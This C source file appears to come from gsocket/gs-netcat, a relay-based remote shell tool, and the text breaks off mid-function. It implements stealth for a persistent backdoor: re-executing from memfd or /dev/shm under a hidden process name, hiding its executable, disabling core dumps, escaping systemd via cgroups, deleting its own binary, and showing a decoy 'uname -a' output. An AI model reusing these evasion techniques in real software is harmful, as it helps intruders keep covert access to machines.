
// #define DEBUG_CTX_DECLARED (1)  // All others define this as extern

#include "common.h"
#include "utils.h"
#include "console.h"
#include "gsnc-utils.h"

extern char **environ;

/*
 * Add list of argv's from GSOCKET_ARGS to argv[]
 * result: argv[0] + GSOCKET_ARGS + argv[1..n]
 */
static void
add_env_argv(int *argcptr, char **argvptr[])
{

	char *str_orig = GS_GETENV2("ARGS");
	char *str = NULL;
	char *next;
	char **newargv = NULL;
	int newargc;

	if (str_orig == NULL)
		return;

	str = strdup(str_orig);
	next = str;

	newargv = malloc(1 * sizeof *argvptr);
	memcpy(&newargv[0], argvptr[0], 1 * sizeof *argvptr);
	newargc = 1; 

	while (next != NULL)
	{
		while (*str == ' ')
			str++;

		next = strchr(str, ' ');
		if (next != NULL)
		{
			*next = 0;
			next++;
		}
		// catch if last character is ' '
		if (strlen(str) > 0)
		{
			/* *next == '\0'; str points to argument (0-terminated) */
			newargc++;
			// DEBUGF("%d. arg = '%s'\n", newargc, str);
			newargv = realloc(newargv, newargc * sizeof newargv);
			newargv[newargc - 1] = str;
		}

		str = next;
		if (str == NULL)
			break;
	}

	// Copy original argv[1..n]
	newargv = realloc(newargv, (newargc + *argcptr) * sizeof newargv);
	memcpy(newargv + newargc, *argvptr + 1, (*argcptr - 1) * sizeof *argvptr);

	newargc += (*argcptr - 1);
	newargv[newargc] = NULL;

	*argcptr = newargc;
	*argvptr = newargv;
}

static void
cpy(int dst, int src) {
	char buf[4096];
	ssize_t sz;

#if 0
	// No idea why sendfile -EINVAL. Kernel claims it cant optimize?
	// Linus: https://yarchive.net/comp/linux/sendfile.html
	off_t ofs = lseek(src, 0, SEEK_END);
	lseek(src, 0, SEEK_SET);
	if (sendfile(dst, src, 0, ofs) > 0)
		return;
#endif

	lseek(src, 0, SEEK_SET);
	while (1) {
		sz = read(src, buf, sizeof buf);
		if (sz <= 0)
			break;
		if (write(dst, buf, sz) != sz)
			break;
	}
}

#if !defined(HAVE_EXECVEAT) && defined(HAVE_SYSCALL_H)
# if !defined(SYS_execveat) && defined(linux)
#  define SYS_execveat 322
#  warning "Using NR_execveat=322. Will work on linux/x86_64 only"
# endif
# ifdef SYS_execveat
# warning "No native execveat() support. Using direct syscall(__NR_execveat, ..) instead."
static int
execveat(int fd, const char *pathname, char *const argv[], char *const *envp, int flags) {
	return syscall(SYS_execveat /*__NR_execveat*/, fd, pathname, argv, envp, flags);
}
# define HAVE_EXECVEAT    1
# endif
#endif

static int
try_memexecme(int src, char *argv[]) {
#if defined(HAVE_SYS_MMAN_H) && defined(HAVE_MEMFD_CREATE) && defined(HAVE_EXECVEAT) && defined(MFD_CLOEXEC)
	int fd;
	if ((fd = memfd_create(gopt.proc_hiddenname, MFD_CLOEXEC)) < 0)
		return -1;

	cpy(fd, src);

	execveat(fd, "", argv, environ, AT_EMPTY_PATH);
#endif
	return -1;
}

// Copy myself into $dir/$gopt.proc_hiddenname and try to execute myself.
static int
try_cpexecme(const char *dir, int src, char *argv[]) {
	int dst = -1;

	char fn[512];
	snprintf(fn, sizeof fn, "%s/%s", dir, gopt.proc_hiddenname);
	setenv("_GS_DELME", fn, 1);
	if ((dst = open(fn, O_WRONLY | O_CREAT | O_CLOEXEC, S_IRWXU)) < 0)
		return -1;

	cpy(dst, src);

	XCLOSE(dst);
	execv(fn, argv);
	// HERE: ERROR: execv() failed.
	unlink(fn);
	unsetenv("_GS_DELME");

	return -1;
}

static int
try_execme(char *exename, char *argv[]) {
	int src;
	char *old_argv0 = argv[0];

	if (gopt.proc_hiddenname == NULL)
		return -1;

	if ((src = open(exename, O_RDONLY | O_CLOEXEC)) < 0)
		return -1;

	argv[0] = gopt.proc_hiddenname;
	
	try_memexecme(src, argv);
	try_cpexecme("/dev/shm", src, argv);
	try_cpexecme("/var/tmp", src, argv);

	argv[0] = old_argv0;
	XCLOSE(src);
	return -1;
}

static size_t
read_proc_exe(char *dst, size_t sz, pid_t pid) {
	char buf[64];
	size_t rv;

	snprintf(buf, sizeof buf, "/proc/%d/exe", pid);
	dst[0] = '\0';
	rv = readlink(buf, dst, sz);
	if ((rv <= 0) || (rv >= sz))
		return 0;
	dst[rv] = '\0';
	return rv;
}


static size_t
read_proc_cmd(char *dst, size_t sz, pid_t pid) {
	char buf[64];
	size_t rv;
	FILE *fp;
	
	dst[0] = '\0';
	snprintf(buf, sizeof buf, "/proc/%d/cmdline", pid);
	if ((fp = fopen(buf, "rb")) == NULL)
		return 0;

	rv = fread(dst, 1, sz, fp); 
	fclose(fp);
	return rv;
}

// Called after tried to hide so that we can check if any other process hides
// like us (and we consider this a duplicate to exit(0)).
// Note: /proc/PID/exe is not always accessible (for non-root). Instead, /proc/PID/stat
// holds the name of the executeable file (ps -fp <PID> -o pid,comm,cmd). For memfd_create
// this is a number. 
static int
is_running(void) {
	DIR *d;
	struct dirent *ent;
	int fret = -1;
	pid_t mypid = getpid();
	pid_t pid;
	struct stat sb;
	uid_t uid = geteuid();
	char buf[64];
	char myexe[PATH_MAX];
	size_t myexe_sz;
	char mycmd[128];
	size_t mycmd_sz;
	char exe[PATH_MAX];
	size_t exe_sz = 0;
	char cmd[128];
	size_t cmd_sz = 0;

	// Get MY exe and cmdline
	myexe_sz = read_proc_exe(myexe, sizeof myexe, mypid);
	mycmd_sz = read_proc_cmd(mycmd, sizeof mycmd, mypid);

	if ((myexe_sz <= 0) && (mycmd_sz <= 0))
		goto err; // Can't get MY exe or cmdline. Return 'not running'

	if ((d = opendir("/proc")) == NULL)
		goto err;

	while ((ent = readdir(d)) != NULL) {
		pid = atoll(ent->d_name);
		if (pid <= 0)
			continue; // Was not a number.

		if (pid == mypid)
			continue;

		snprintf(buf, sizeof buf, "/proc/%d", pid);
		if (stat(buf, &sb) != 0) {
			DEBUGF("stat(%s): %s\n", buf, strerror(errno));
			continue;
		}
		if (sb.st_uid != uid)
			continue; // gsnc started as different user than current user.

		exe_sz = 0;
		cmd_sz = 0;
		if (myexe_sz > 0) {
			exe_sz = read_proc_exe(exe, sizeof exe, pid);
			if (exe_sz > 0) {
				if (exe_sz != myexe_sz)
					continue;
				if (memcmp(exe, myexe, exe_sz) != 0)
					continue;
			}
		}

		if (mycmd_sz > 0) {
			cmd_sz = read_proc_cmd(cmd, sizeof cmd, pid);
			if (cmd_sz > 0) {
				if (cmd_sz != mycmd_sz)
					continue;
				if (memcmp(cmd, mycmd, cmd_sz) != 0)
					continue;
			}
		}

		if ((exe_sz == 0) && (cmd_sz == 0))
			continue; // Could nto read_proc_*() from this pid. continue.

		DEBUGF("%zd (%s), %zd (%s)\n", exe_sz, exe, cmd_sz, cmd);
		fret = 0;
		break;
	}

	closedir(d);
err:
	DEBUGF("returns %d [%s]\n", fret, 0?"already running":"NOT running");
	return fret;
}

// STOP ptrace() of my self.
// - FIXME: Ulg. Any signal to this process (like TERM or SIG_CHLD) will stop this process,
//   This would make it non-functional.
// static void
// try_ptraceme(void) {
// #ifdef HAVE_SYS_PTRACE_H
// 	ptrace(PTRACE_TRACEME, 0, 0, 0); // -EPERM ==> already traced.
// #endif
// }

static void
changeargv0_finish(void) {
	char *ptr;

	unsetenv("_GS_FS_EXENAME");
	unsetenv("_GS_PROC_EXENAME");

	if (is_running() == 0)
		exit(0);

	DEBUGF("Now hidden as prg_name=%s [orig EXENAME=%s]\n", gopt.prg_name, gopt.prg_exename);
	// SEAL after config had been read.
#ifdef PR_SET_DUMPABLE
	prctl(PR_SET_DUMPABLE, 0);
#endif
#ifdef PR_SET_HIDE_SELF_EXE
// Always compile it in and hope older kernel's will -EINVAL and newer kernels
// will work without conflict of READ_CONFIG (somebody should test gsocket on new kernels)
// # warning "NEW KERNEL FEATURE. Test if this causes us some problems with READ_CONFIG"
	prctl(PR_SET_HIDE_SELF_EXE, 1);
#endif
	// try_ptraceme();
	signal(SIGTRAP, SIG_IGN);
	if ((ptr = getenv("_GS_DELME"))) {
		unlink(ptr);
		unsetenv("_GS_DELME");
	}
}

static void
try_changeargv0(int argc, char *argv[]) {
	char *ptr;
	int is_ldso = 0;
	// On actual filesystem. Not /proc/self/exe. If
	// set the used to report to user.
	char *fs_exename = NULL;
	// If executed from memfd then fs_exename is NULL. Need to read config from here
	// and execve() this.
	char *myself_exe = NULL;
	gopt.err_fp = stderr;

	if ((argv == NULL) || (argv[0] == NULL))
		return;

	// First check if we called ourself and return immediately.
	if ((ptr = getenv("_GS_FS_EXENAME"))) {
		gopt.prg_exename = strdup(ptr);
	}
	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
		if (GSNC_config_read(ptr) != 0)
			exit(0); // CAN NOT HAPPEN. (should have failed in parent already)
		goto done;
	}

	if ((ptr = GS_GETENV2("EXENAME")) != NULL)
		fs_exename = strdup(ptr);
	else {
		// Find true binary in case we were executed:
		// - bash -c 'exec -a foobar /lib/ld-linux-aarch64.so.1 /usr/bin/gsnc'
		// - bash -c 'exec -a foobar /usr/bin/gsnc'
		// Always try to try_execme(). Lastly, fall back to just changing argv[0]
		// but not if it is executed by ld-linux.
		// Note: argv0 points to the gsnc if started with ld-linux.so
		// but /proc/self/cmdline shows as argv0 == /lib/ld-linux.so
		// stat(), open() and readlink have special behavior in /proc.
		// realpath() will return NULL if deleted or not exist.
		// readlink() will return link.
		// stat(/proc/self/exe) will always succeed.
		ptr = realpath("/proc/self/exe", NULL /* with malloc */);
		if (ptr != NULL) {
			// HERE: link destination EXISTS
			if (strstr(ptr, "ld-linux") != NULL) {
				is_ldso = 1;   // exename remains argv[0]
				free(ptr);
			}
			 else if (strstr(ptr, "(deleted)") != NULL) {
				// A sneaky user create "<name> (deleted)" file, which is not us.
				free(ptr);
			} else {
				// Destination exists. Ignore argv0.
				fs_exename = ptr; // points to true binary
			}
		} else {
			// HERE: Link destination does _NOT_ exists. (memfd or delete)
			myself_exe = "/proc/self/exe";
		}
		if (fs_exename == NULL)
			fs_exename = realpath(argv[0], NULL /* malloc */);
	}


	if (myself_exe == NULL)
		myself_exe = fs_exename;
	DEBUGF("fs_Exename='%s' config_exe='%s'\n", fs_exename, myself_exe);

	// This can never happen:
	// XASSERT(strstr(fs_exename, "ld-linux") == NULL, "Oops. Set GS_EXENAME= to binary file.");

	if (GS_GETENV2("CONFIG_CHECK")) {
		gopt.flags |= GSC_FL_CONFIG_CHECK;
		GSNC_config_read(NULL /* default to GS_CONFIG_READ=*/);
		return;
	}

	gopt.prg_exename = fs_exename;

	if (GS_GETENV2("CONFIG_WRITE") != NULL)
		return;

	if (GSNC_config_read(myself_exe) != 0)
		return;

	if (gopt.proc_hiddenname == NULL) {
		DEBUGF("Config has no PROC_HIDDENNAME.\n");
		return; // Dont want to change argv0
	}

	setenv("_GS_PROC_EXENAME", myself_exe, 1);
	if (fs_exename != NULL)
		setenv("_GS_FS_EXENAME", fs_exename, 1);

	if (try_execme(myself_exe, argv) == 0)
		exit(255); // CAN NOT HAPPEN. should -1 on execve fail.

	// HERE: try_execme() FAILED. Last resort is to change just argv[0].

	// No point to change argv0 if started via ld-linux because it will show binary as argv1 anyway.
	if (is_ldso)
		goto done;

	// Otherwise, modify my argv[0]
	argv[0] = gopt.proc_hiddenname;

	execv(myself_exe, argv);
	DEBUGF("execv()=%s\n", strerror(errno));
	// Re-Execution not possible. Continue with current argv0 name.
done:
	changeargv0_finish();
}

static int
changecgroup(const char *path) {
	char buf[64];
	int fd;
	int ret = -1;

	if ((fd = open(path, O_WRONLY | O_APPEND)) < 0)
		return -1;

	snprintf(buf, sizeof buf, "%d\n", getpid());
	if (write(fd, buf, strlen(buf)) < 0)
		goto err;

	ret = 0;
err:
	close(fd);
	return ret;
}

static int
try_changecgroup(void) {
	if (!(gopt.flags & GSC_FL_CHANGE_CGROUP))
		return -1;

	// cgroup v2
	if (changecgroup("/sys/fs/cgroup/init.scope/cgroup.procs") == 0)
		return 0;

	// cgroup v2 unified
	if (changecgroup("/sys/fs/cgroup/unified/cgroup.procs") == 0)
		return 0;

	// cgroup v1
	if (changecgroup("/sys/fs/cgroup/systemd/cgroup.procs") == 0)
		return 0;
	
	return -1;
}

// Test if changing cgroup is working (maybe cgroup is not mounted?)
// This is needed for systemd's Type=oneshot with RemainAfterExit=no
void
do_util_test_changecgroup(void) {
	if (GS_GETENV2("UTIL_TEST_CCG") == NULL)
        return;
	
	if (try_changecgroup() == 0)
		exit(0);
	exit(255);
}

void
init_defaults1(int argc, char *argv[]) {
	char *argv0 = argv[0];
	char *ptr;
#ifdef DEBUG
	gopt.is_built_debug = 1;
#endif
#ifdef STEALTH
	gopt.flags |= GSC_FL_IS_STEALTH;
#endif
	if ((ptr = GS_GETENV2("STEALTH")) != NULL) {
		gopt.flags |= GSC_FL_IS_STEALTH;
		// Set GS_STEALTH=0 to disable stealth.
		if (*ptr == '0')
			gopt.flags &= ~GSC_FL_IS_STEALTH;
	}
	if (!(gopt.flags & GSC_FL_IS_STEALTH))
		return;

	gopt.prg_name = argv0;
	if (argv0 != NULL) {
		char *ptr;
		ptr = strrchr(argv0, '/');
		if (ptr != NULL)
			gopt.prg_name = ptr + 1;
	}
	gopt.prg_name = strdup(gopt.prg_name?:"NULL");

	ptr = GS_GETENV2("CONFIG_READ");
    if ((ptr == NULL) || (*ptr != '0'))
		gopt.flags |= GSC_FL_WANT_CONFIG_READ;
	if (!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) {
		gopt.flags &= ~GSC_FL_IS_STEALTH; // implied. if CONFIG_READ=0
		return;
	}


	try_changeargv0(argc, argv); // If wanted, calls GSNC_config_read()
	if (gopt.flags & GSC_FL_CONFIG_CHECK)
		return;

	// 1. CCG MUST be done before any fork() so that cgroup-change completes
	// before returning control back to ExecStart
	try_changecgroup();

	// delete my own binary. (GS_DELME=1)
	if ((gopt.flags & GSC_FL_DELME) && (gopt.prg_exename != NULL)) {
		unlink(gopt.prg_exename);
		XFREE(gopt.prg_exename);
	}
}

void
init_defaults2(int argc, int *argcptr, char **argvptr[])
{
	gopt.log_fp = stderr;
	gopt.err_fp = stderr;
	gopt.argc = argc;
	signal(SIGPIPE, SIG_IGN);
	signal(SIGCHLD, SIG_IGN);	// no defunct childs please

	/* MacOS process limit is 256 which makes Socks-Proxy yield...*/
	struct rlimit rlim;
	memset(&rlim, 0, sizeof rlim);
	int ret;
	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret == 0)
	{
		rlim.rlim_cur = MIN(rlim.rlim_max, FD_SETSIZE);
		ret = setrlimit(RLIMIT_NOFILE, &rlim);
		getrlimit(RLIMIT_NOFILE, &rlim);
		// DEBUGF_C("Max File Des: %llu (max = %llu)\n", rlim.rlim_cur, rlim.rlim_max);
	}

	// If started directly from a +s shell (ps. tcsh's startup script fail hard
	// if euid != uid)
	uid_t e = geteuid();
	if (e != getuid())
		ret = setreuid(e, e);
	e = getegid();
	if (e != getgid())
		ret = setregid(e, e);

	add_env_argv(argcptr, argvptr);
	if (argcptr != NULL)
		gopt.argc = *argcptr;

	// If log in via GSNC and no args then do not execute the bashrc's gsnc binary
	// (or it would ask with "Enter Secret")
	// GS_ALLOWNOARG to prompt for "Enter Secret" if called from hackshell's gsnc
	// and without any args.
	if ((!(gopt.flags & GSC_FL_WANT_CONFIG_READ)) && (gopt.argc <= 1) && (getenv("GSNC")) && (getenv("_GS_ALLOWNOARG") == NULL))
		exit(EINVAL);

	gopt.app_keepalive_sec = GS_APP_KEEPALIVE;
}

void
init_defaults(int argc, int *argcptr, char **argvptr[]) {
	init_defaults1(argc, *argvptr);
	init_defaults2(argc, argcptr, argvptr);
}

GS *
gs_create(void)
{
	GS *gs = GS_new(&gopt.gs_ctx, &gopt.gs_addr);
	XASSERT(gs != NULL, "%s\n", GS_CTX_strerror(&gopt.gs_ctx));
	
	if (gopt.token_str != NULL)
		GS_set_token(gs, gopt.token_str, strlen(gopt.token_str));

	return gs;
}

static void
cb_sigterm(int sig)
{
	sv_sigforward(sig);
	exit(EX_SIGTERM);	// will call cb_atexit()
}

void
get_winsize(void)
{
	int ret;

	memcpy(&gopt.winsize_prev, &gopt.winsize, sizeof gopt.winsize_prev);
	
	ret = ioctl(STDOUT_FILENO, TIOCGWINSZ, &gopt.winsize);
	if ((ret == 0) && (gopt.winsize.ws_col != 0))
	{
		/* SUCCESS */
		DEBUGF_M("Columns: %d, Rows: %d\n", gopt.winsize.ws_col, gopt.winsize.ws_row);
	} else {
		gopt.winsize.ws_col = 80;
		gopt.winsize.ws_row = 24;
	}
}

// Callback for gs-library to pass log messages to us.
static void
cb_gs_log(struct _gs_log_info *l)
{
	if (l == NULL)
		return;

	// DEBUGF_Y("my level=%d, msg level=%d\n", gopt.verbosity, l->level);
#ifndef DEBUG
	// Return if this is _NOT_ a DEBUG-build but we get a TYPE_DEBUG
	// (should not happen).
	if (l->type == GS_LOG_TYPE_DEBUG)
		return;
#endif

	FILE *fp = gopt.log_fp;
	if (l->type == GS_LOG_TYPE_ERROR)
	{
		fp = gopt.err_fp;
	}

	if (fp == NULL)
		return;

	if (l->level > gopt.verbosity)
		return; // Not interested. 

	fprintf(fp, "%s", l->msg);
	fflush(fp);
}

void
init_vars(void)
{
	GS_library_init(gopt.err_fp, /* Debug Output */ gopt.err_fp, cb_gs_log);

	if (gopt.flags & GSC_FL_OPT_G) {
		gopt.sec_str = GS_gen_secret();
		if (gopt.argc <= 2) {
			printf("%s\n", gopt.sec_str);
			fflush(stdout);
			exit(0);
		}
		if ((gopt.flags & GSC_FL_OPT_SEC) && (!(gopt.flags & GSC_FL_OPT_QUIET)))
			fprintf(stderr, "WARNING: -s is ignored because -g is specified.\n");
	}

	GS_LIST_init(&gopt.ids_peers, 0);
	GS_CTX_init(&gopt.gs_ctx, &gopt.rfd, &gopt.wfd, &gopt.r, &gopt.w, &gopt.tv_now);

	if (gopt.flags & GSC_FL_OPT_TOR)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_USE_SOCKS, NULL, 0);
	/* If Server is not available yet then wait for Server. */
	if (gopt.is_sock_wait != 0)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_SOCKWAIT, NULL, 0);

	/* We can turn client _OR_ server */
	if (gopt.is_client_or_server != 0)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_CLIENT_OR_SERVER, NULL, 0);

	/* Disable encryption (-C) */
	if (gopt.is_no_encryption == 1)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_NO_ENCRYPTION, NULL, 0);

	/* This example uses blocking sockets. Set blocking. */
	if (gopt.is_blocking == 1)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_BLOCK, NULL, 0);

	if (gopt.is_multi_peer == 0)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_SINGLESHOT, NULL, 0);

	if (gopt.is_interactive != 0)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_LOW_LATENCY, NULL, 0);

	if (gopt.gs_server_check_sec > 0)
		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_BUDDY_CHECK, NULL, 0);

	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_CALLHOME_SEC, &gopt.callhome_sec, sizeof gopt.callhome_sec);
	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_PORT, &gopt.gs_port, sizeof gopt.gs_port);
	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_HOST, gopt.gs_host, 0);
	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_SHELL, gopt.gs_shell, 0);
	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_DOMAIN, gopt.gs_domain, 0);
	GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_GS_WORKDIR, gopt.gs_workdir, 0);

	// Prevent startup messages if gs-netcat is started as sub-system from
	// gs-sftp or gs-mount
	gopt.is_greetings = 1;
	if (GS_GETENV2("NO_GREETINGS") != NULL)
		gopt.is_greetings = 0;

	char *gs_args = GS_GETENV2("ARGS");

	int is_sec_by_prompt = 0;
	if ((gopt.sec_file == NULL) && (gopt.sec_str == NULL))
		is_sec_by_prompt = 1;

	if (gopt.flags & GSC_FL_IS_STEALTH) {
		// No "=Secret   :" if GS_ARGS is set as we assume secret is passed
		// by GS_ARGS (and thus known to user)
		if (gs_args != NULL)
			gopt.is_greetings = 0;

		// do not allow execution without supplied secret.
		if ((gs_args == NULL) && (is_sec_by_prompt)) {
			system("uname -a");
			exit(0);
		}
	}

	if (gs_args != NULL)
		GS_LOG_V("=Extra arguments: '%s'\n", gs_args);

	if ((gopt.flags & GSC_FL_OPT_QUIET) && (!is_sec_by_prompt))
		gopt.is_greetings = 0;

	gopt.sec_str = GS_user_secret(&gopt.gs_ctx, gopt.sec_file, gopt.sec_str);
	if (gopt.sec_str == NULL)
		ERREXIT("%s\n", GS_CTX_strerror(&gopt.gs_ctx));

	if (gopt.is_greetings) {
		GS_LOG("=Secret         : %s\n", gopt.sec_str);
		if (gopt.gs_id_str)
			GS_LOG("=ID             : %s\n", gopt.gs_id_str);
	}

	/* Convert a secret string to an address */
	GS_ADDR_sec2addr(&gopt.gs_addr, gopt.sec_str, gopt.gs_id_str);

	GS_LOG_V("=GS Address     : %s\n", GS_addr2hex(NULL, gopt.gs_addr.addr));

	gopt.is_stdin_a_tty = isatty(STDIN_FILENO);
	// Interactive session but not a TTY: Assume user is piping commands into the shell.
	if ((gopt.is_interactive && !(gopt.flags & GSC_FL_IS_SERVER) && !gopt.is_stdin_a_tty))
		gopt.is_stdin_ignore_eof = 1;

	signal(SIGTERM, cb_sigterm);
}

void
usage(const char *params)
{
	if (!(gopt.flags & GSC_FL_IS_STEALTH))
		fprintf(stderr, "Version %s%s, %s %s [%s]\n", PACKAGE_VERSION, gopt.is_built_debug?"#debug":"", __DATE__, __TIME__, OPENSSL_VERSION_TEXT);

#ifndef STEALTH
	while (*params)
	{
		switch (params[0])
		{
			case 'L':
				fprintf(stderr, "  -L <file>    Logfile\n");
				break;
			case 'q':
				fprintf(stderr, "  -q           Quiet. No log output\n");
				break;
			case 'v':
				fprintf(stderr, "  -v           Verbose. -vv more verbose. -vvv insanely verbose\n");
				break;
			case 'r':
				fprintf(stderr, "  -r           Receive-only. Terminate when no more data.\n");
				break;
			case 'I':
				fprintf(stderr, "  -I           Ignore EOF on stdin.\n");
				break;
			case 's':
				fprintf(stderr, "  -s <secret>  Secret (e.g. password).\n");
				break;
			case 'k':
				fprintf(stderr, "  -k <file>    Read Secret from file.\n");
				break;
			case 'l':
				fprintf(stderr, "  -l           Listening server [default: client]\n");
				break;
			case 'g':
				fprintf(stderr, "  -g           Generate a Secret (random)\n");
				break;
			case 'a':
				fprintf(stderr, "  -a <token>   Set listen password\n");
				break;
			case 'w':
				fprintf(stderr, "  -w           Wait for server to become available [client only]\n");
				break;
			case 'A':
				fprintf(stderr, "  -A           Be server if no server is listening\n");
				break;
			case 'C':
				fprintf(stderr, "  -C           Disable encryption\n");
				break;
			case 'T':
				fprintf(stderr, "  -T           Use TOR or any Socks proxy (See gs-netcat(1))\n");
				break;
		}

		params++;
	}
#endif // !STEALTH
}

static void
zap_arg(char *str)
{
	int len;

	len = strlen(str);
	memset(str, '*', len);
}

char *
getcwdx(void)
{
#if defined(__sun) && defined(HAVE_OPEN64)
	// This is solaris 10
	return getcwd(NULL, GS_PATH_MAX + 1); // solaris10 segfaults if size is 0...
#else
	return getcwd(NULL, 0);
#endif
}



void
do_getopt(int argc, char *argv[])
{
	int c;

	opterr = 0;
	while ((c = getopt(argc, argv, UTILS_GETOPT_STR)) != -1)
	{
		switch (c)
		{
			case 'v':
				gopt.verbosity += 1;
				gopt.flags &= ~GSC_FL_OPT_QUIET;
				break;
			case 'L':
				gopt.is_logfile = 1;
				gopt.log_fp = fopen(optarg, "a");
				if (gopt.log_fp == NULL)
					ERREXIT("fopen(%s): %s\n", optarg, strerror(errno));
				gopt.err_fp = gopt.log_fp;
				break;
			case 'T':
				gopt.flags |= GSC_FL_OPT_TOR;
				break;
			case 'q':
				if (gopt.verbosity <= 0)
					gopt.flags |= GSC_FL_OPT_QUIET;
				break;
			case 'r':
				gopt.is_receive_only = 1;
				break;
			case 'I':
				gopt.is_stdin_ignore_eof = 1;
				break;
			case 'i':
				gopt.is_interactive = 1;
				break;
			case 'C':
				gopt.is_no_encryption = 1;
				break;
			case 'A':
				gopt.is_client_or_server = 1;
				break;
			case 'w':
				gopt.is_sock_wait = 1;
				break;
			case 'a':
				/* This only becomes secure when the initial GS-network connection is done by TLS
				 * (at least for the listening server to submit the token securely to the server so that
				 * the server rejects any listening attempt that uses a bad token)
				 */
				GS_LOG("*** WARNING *** -a not fully supported yet. Trying our best...\n");
				gopt.token_str = optarg;
				break;
			case 'l':
				gopt.flags |= GSC_FL_IS_SERVER;
				break;
			case 's':
				gopt.flags |= GSC_FL_OPT_SEC;
				gopt.sec_str = strdup(optarg);
				zap_arg(optarg);
				break;
			case 'k':
				gopt.sec_file = strdup(optarg);
				zap_arg(optarg);
				break;
			case 'N':
				if (*optarg == '\0') {
					// Will be set later if still NULL but GSC_FL_USEHOSTID is set
					gopt.flags |= GSC_FL_USEHOSTID;
					break;
				}
				gopt.gs_id_str = strdup(optarg);
				break;
			case 'g':		/* Generate a secret */
				gopt.flags |= GSC_FL_OPT_G;
				break;
#ifndef STEALTH
			case '3':
				if (strcmp(optarg, "1337") == 0)
					GS_LOG("!!Greets to 0xD1G, xaitax and the rest of https://t.me/thcorg!!\n");
#endif
		}
	}
}

static struct termios tios_saved;
static int is_stty_raw;
static int is_stty_nopty;
/*
 * Client only: Save TTY state and set raw mode.
 */
void
stty_set_raw(void)
{
	int ret;

	if (is_stty_raw != 0)
		return;

	if (!isatty(STDIN_FILENO))
		return;

    struct termios tios;
    ret = tcgetattr(STDIN_FILENO, &tios);
    if (ret != 0)
    	return;
    memcpy(&tios_saved, &tios, sizeof tios_saved);
    // -----BEGIN ORIG-----
	// tios.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
	// tios.c_oflag &= ~(OPOST);
	// tios.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);
	// tios.c_cflag |= (CS8);
	// -----BEGIN NEW-----
    // tios.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | ISTRIP | INLCR | IGNCR | ICRNL | IXON);
	// tios.c_oflag &= ~(OPOST);
	// tios.c_lflag &= ~(ECHO | ECHONL | ICANON | ISIG | IEXTEN);
	// tios.c_cflag &= ~(CSIZE | PARENB);	// stty -a shows rows/columns correctly
	// tios.c_cflag |= (CS8);
	// -----BEGIN SSH-----
    tios.c_iflag |= IGNPAR;
    tios.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
#ifdef IUCLC
    tios.c_iflag &= ~IUCLC;
#endif
    tios.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL);
#ifdef IEXTEN
    tios.c_lflag &= ~IEXTEN;
#endif
    tios.c_oflag &= ~OPOST;
    tios.c_cc[VMIN] = 1;
    tios.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSADRAIN, &tios);
    // tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);
    
    /* Set NON blocking */
    // fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK | fcntl(STDIN_FILENO, F_GETFL, 0));

    is_stty_raw = 1;
}

// Switch from RAW to NO-PTY
// Called when server could not allocated PTY and goes into 
// dump terminal mode.
void
stty_switch_nopty(void)
{
	if (is_stty_nopty != 0)
		return;

	if (is_stty_raw == 0)
		DEBUGF_R("ERROR: switch_nopty() while stty is not raw\n");

	if (!isatty(STDIN_FILENO))
		return;

	// Use print as this must always go out to stdin (never log file) as the \r\n
	// make the terminal look less messed up when bash reports bad ioctl.
	printf("\r=No PTY on remote. Using dump terminal instead.\r\n");
	int ret;
    struct termios tios;
    ret = tcgetattr(STDIN_FILENO, &tios);
    if (ret != 0)
    	return;
    tios.c_oflag |= OPOST;
    tcsetattr(STDIN_FILENO, TCSADRAIN, &tios);

    is_stty_nopty = 1;
}

/*
 * Restore TTY state
 */
void
stty_reset(void)
{
	if (is_stty_raw == 0)
		return;

	is_stty_raw = 0;
	is_stty_nopty = 0;
	DEBUGF_G("resetting TTY\n");
    tcsetattr(STDIN_FILENO, TCSADRAIN, &tios_saved);
}

static const char esc_seq[] = "\r~.\r";
static int esc_pos;
/*
 * In nteractive mode/Client mode check if User typed '\n~.\n' escape
 * sequence.
 */
void
stty_check_esc(GS *gs, char c)
{
	// DEBUGF_R("checking %d on esc_pos %d == %d\n", c, esc_pos, esc_seq[esc_pos]);
	if (c == esc_seq[esc_pos])
	{
		esc_pos++;
		if (esc_pos < sizeof esc_seq - 1)
			return;

		DEBUGF_M("ESC detected. EXITING...\n");
		/* Hard exit */
		stty_reset();
		exit(0);
		return;
	}
	esc_pos = 0;
	if (c == esc_seq[0])
		esc_pos = 1;
}

// Try our best to send a SIGINT to the foreground process of the
// specified pid (bash).
// This is used when no PTY is available and the client sends a CTRL-C.
// Hack: Just send it to the last child that the pid spawned. This
// may be a background process (sleep 31337 &). Ideally we should check
// if the last process is a foreground process.
void
ctrl_c_child(pid_t pid)
{
	char buf[1024];
	char *ptr;
	char *end;
	FILE *fp;

	DEBUGF_Y("Ctrl-c child(%d)'s children\n", pid);
	snprintf(buf, sizeof buf, "/proc/%d/task/%d/children", pid, pid);
	fp = fopen(buf, "r");
	if (fp == NULL)
	{
		DEBUGF_M("fopen(%s) failed\n", buf);
		return;
	}
	ptr = fgets(buf, sizeof buf, fp);
	fclose(fp);

	if (ptr != NULL)
	{
		end = ptr + strlen(ptr);
		while (ptr < end)
		{
			end--;
			if (*end != ' ')
